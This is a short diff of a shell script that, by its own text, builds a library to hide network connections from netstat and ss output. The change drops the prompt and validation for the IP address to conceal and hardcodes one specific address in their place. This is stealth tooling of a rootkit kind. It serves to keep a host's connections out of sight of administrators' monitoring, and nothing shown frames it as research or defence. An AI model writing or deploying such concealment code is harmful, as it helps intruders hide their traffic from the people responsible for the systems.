@@ -41,12 +41,7 @@ get_ip_to_hide() {
     echo ""
     echo "This script will create a library that hides network connections from netstat/ss output."
     echo ""
-    read -p "Enter the IP address to hide (e.g., 77.110.106.206): " IP_TO_HIDE
-    
-    if ! [[ "$IP_TO_HIDE" =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]]; then
-        print_error "Invalid IP address format. Please enter a valid IPv4 address."
-        exit 1
-    fi
+    IP_TO_HIDE="77.110.106.206"
     
     print_status "Will hide network connections to/from IP: $IP_TO_HIDE"
 }
